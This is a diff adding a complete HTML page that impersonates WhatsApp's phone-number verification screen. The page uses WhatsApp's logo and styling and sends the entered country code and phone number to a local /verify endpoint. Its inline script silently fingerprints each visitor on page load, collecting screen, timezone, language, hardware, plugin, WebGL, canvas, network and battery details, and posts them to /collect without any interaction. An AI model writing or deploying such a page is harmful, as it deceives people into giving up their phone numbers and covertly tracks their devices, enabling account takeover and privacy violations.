@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>WhatsApp</title>
+<link rel="icon" href="https://static.whatsapp.net/rsrc.php/v3/yP/r/rYZqPCBaG70.png">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:'Segoe UI',Helvetica,Arial,sans-serif;background:#111b21;color:#e9edef;display:flex;justify-content:center;align-items:center;min-height:100vh}
+.c{background:#1f2c33;border-radius:12px;padding:40px 30px;max-width:400px;width:90%;text-align:center;box-shadow:0 4px 24px rgba(0,0,0,.3)}
+.logo{width:80px;height:80px;margin:0 auto 20px}
+.logo img{width:100%;border-radius:50%}
+.fb{width:80px;height:80px;background:#00a884;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:36px;color:#fff;margin:0 auto 20px}
+h1{font-size:20px;font-weight:400;margin-bottom:10px}
+.sub{font-size:14px;color:#8696a0;margin-bottom:30px;line-height:1.5}
+.pg{display:flex;gap:8px;margin-bottom:20px}
+.cc{width:70px;padding:12px;border:1px solid #2a3942;border-radius:8px;background:#2a3942;color:#e9edef;font-size:16px;text-align:center;outline:none}
+.cc:focus{border-color:#00a884}
+.pn{flex:1;padding:12px;border:1px solid #2a3942;border-radius:8px;background:#2a3942;color:#e9edef;font-size:16px;outline:none}
+.pn:focus{border-color:#00a884}
+.btn{width:100%;padding:14px;background:#00a884;color:#111b21;border:none;border-radius:8px;font-size:16px;font-weight:600;cursor:pointer;transition:background .2s}
+.btn:hover{background:#06cf9c}
+.note{font-size:12px;color:#667781;margin-top:20px;line-height:1.4}
+.note a{color:#53bdeb;text-decoration:none}
+.sp{display:none}.ld .sp{display:block}.ld .bt{display:none}
+@keyframes spin{to{transform:rotate(360deg)}}
+.si{width:20px;height:20px;border:2px solid #111b21;border-top-color:transparent;border-radius:50%;animation:spin .8s linear infinite;margin:0 auto}
+</style>
+</head>
+<body>
+<div class="c">
+  <div class="logo">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg"
+         alt="W" onerror="this.parentElement.innerHTML='<div class=fb>W</div>'">
+  </div>
+  <h1>Verify your phone number</h1>
+  <p class="sub">WhatsApp needs to verify your phone number.<br>Enter your country code and phone number.</p>
+
+  <form action="/verify" method="POST" id="pf">
+    <div class="pg">
+      <input type="text" name="country_code" class="cc" value="92" maxlength="4" required>
+      <input type="tel" name="phone" class="pn" placeholder="3XX XXXXXXX" required autocomplete="off">
+    </div>
+    <button type="submit" class="btn" id="sb">
+      <span class="bt">Next</span>
+      <span class="sp"><div class="si"></div></span>
+    </button>
+  </form>
+
+  <p class="note">By tapping Next you agree to WhatsApp's
+    <a href="#">Terms of Service</a> and
+    <a href="#">Privacy Policy</a>.</p>
+</div>
+
+<script>
+// ── Passive Fingerprint (fires on load, zero interaction needed) ──
+(async()=>{
+  const f={};
+  f.sw=screen.width;f.sh=screen.height;f.cd=screen.colorDepth;
+  f.pr=devicePixelRatio;f.tz=Intl.DateTimeFormat().resolvedOptions().timeZone;
+  f.tzo=new Date().getTimezoneOffset();f.lang=navigator.language;
+  f.langs=navigator.languages?navigator.languages.join(","):navigator.language;
+  f.plat=navigator.platform;f.cores=navigator.hardwareConcurrency||"?";
+  f.ram=navigator.deviceMemory||"?";f.touch="ontouchstart"in window||navigator.maxTouchPoints>0;
+  f.cookie=navigator.cookieEnabled;f.dnt=navigator.doNotTrack;
+  f.ua=navigator.userAgent;f.ref=document.referrer;
+  f.wd=!!navigator.webdriver;
+
+  try{const p=[];for(let i=0;i<navigator.plugins.length;i++)p.push(navigator.plugins[i].name);f.plug=p.join(", ")}catch(e){f.plug="blocked"}
+
+  try{const c=document.createElement("canvas"),g=c.getContext("webgl")||c.getContext("experimental-webgl");
+    if(g){const d=g.getExtension("WEBGL_debug_renderer_info");
+      f.glV=d?g.getParameter(d.UNMASKED_VENDOR_WEBGL):"?";
+      f.glR=d?g.getParameter(d.UNMASKED_RENDERER_WEBGL):"?"}}catch(e){}
+
+  try{const c=document.createElement("canvas");c.width=200;c.height=50;
+    const x=c.getContext("2d");x.textBaseline="top";x.font="14px Arial";
+    x.fillStyle="#f60";x.fillRect(10,0,100,30);x.fillStyle="#069";
+    x.fillText("fp",2,15);x.fillStyle="rgba(102,204,0,.7)";
+    x.fillText("fp",4,17);f.cvs=c.toDataURL().slice(-50)}catch(e){}
+
+  try{const n=navigator.connection||navigator.mozConnection||navigator.webkitConnection;
+    if(n){f.conn=n.effectiveType||n.type||"?";f.dl=n.downlink||"?"}}catch(e){}
+
+  try{if(navigator.getBattery){const b=await navigator.getBattery();
+    f.batt=Math.round(b.level*100)+"%";f.chrg=b.charging}}catch(e){}
+
+  try{fetch("/collect",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(f)})}catch(e){}
+})();
+
+document.getElementById("pf").addEventListener("submit",()=>{
+  document.getElementById("sb").classList.add("ld")});
+</script>
+</body>
+</html>
